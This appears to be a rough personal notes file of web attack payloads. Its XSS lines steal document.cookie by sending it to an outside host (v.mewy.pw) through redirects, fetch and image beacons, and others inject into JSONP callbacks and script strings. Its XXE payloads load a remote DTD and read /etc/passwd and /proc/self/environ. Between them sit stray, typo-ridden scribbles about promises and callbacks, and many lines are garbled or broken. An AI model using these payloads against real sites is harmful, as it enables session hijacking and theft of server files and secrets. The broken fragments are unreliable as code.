

default-src 'sef'; img-src 'self'; iframe-src *








# XSS Payloads

<div onload
<body onload
onfocus

http://google.com/$get

$get= "something else"

ftp://

http://google.com/something else


<script>alert(1)</script>
<script src="jqeury.js">$.get("http://whatever.com"+documnet.cookei);
<script>fetch("http://v.mewy.pw")</script
<script>document.replace("XMLHttpRequest")<
<script>document.location="http://v.mewy.pw?"+document.cookie</script>

<img src=x onerror="document.location='http://v.mewy.pw?awekjawegn'+document.location"/>
<script>new Image().src="//v.mewy.pw?"+document.cookie</script>
https:// -> //whatever.com -> https://whatever.com
http:// -> //whatever.com -> http://whatever.com

<svg/onload="alert(1)"/>

document['location']=

http://news.com/weather?type=jsonp&method=somefunction
-> somefunction({json:data})
method=somefunction();// -> somefunction();//({json:data})
somefunction,alert(1),console.log

<script>
function unexecuted() {
  var trackingipaddress=/*$somepostvariable; // don't a trigger a syntax error here
}

var trackingipaddress=/**/"$somepostvariable"
</script>
$somepostvariable=
"+alert(1)+"

//
/* */
",alert(1)//



<script>
for () {
  var res = fetch("http://gogole.com") .
  then()
  .then()
  .theN()
  .finally
}
// res = Promise(fetch('http:'))



res.resolve() // block -> until the fetch complese
// res = httpResponse(http://google.com)


doseomthing("arg", function callback(ret) {

  dosomethingelse("arg", fucntion callbackagain(arg) {

    dosomethingelse("arg", fucntion callbackagain(arg) {

      dosomethingelse("arg", fucntion callbackagain(arg) {

      })
    })
  })

})






















``
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss[
  <!ENTITY % dtd SYSTEM "http://v.mewy.pw/xml/index3.xml">%dtd;%dtf;%step;
]>
<rss>
&file;
</rss>


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss[
  <!ENTITY % dtd SYSTEM "http://v.mewy.pw/xml/index3.xml">%dtd;%dtf;%step;
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<rss>
&file;
</rss>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss[
  <!ENTITY file SYSTEM "file:///proc/self/environ">
]>
<rss>
&file;
</rss>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss[
  <!ENTITY file SYSTEM "http://google.com">
]>
<rss>
&file;
</rss>




<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss[
  <!ENTITY file SYSTEM "http://google.com">
]>
<rss>
<[!CDATA[
<!DOCTYPE>
<html
<body>google.com</body>
]]>
</html>
</rss>

 <!ENTITY % start "<![CDATA[">
 <!ENTITY % stuff SYSTEM "http://google.com">
  <!ENTITY % end "]]>">

  start   stuff    end
  //start
  <!CDATA[ 
  //%stuff  
<!DOCTYPE>
<html
<body>google.com</body>

//end
  ]>
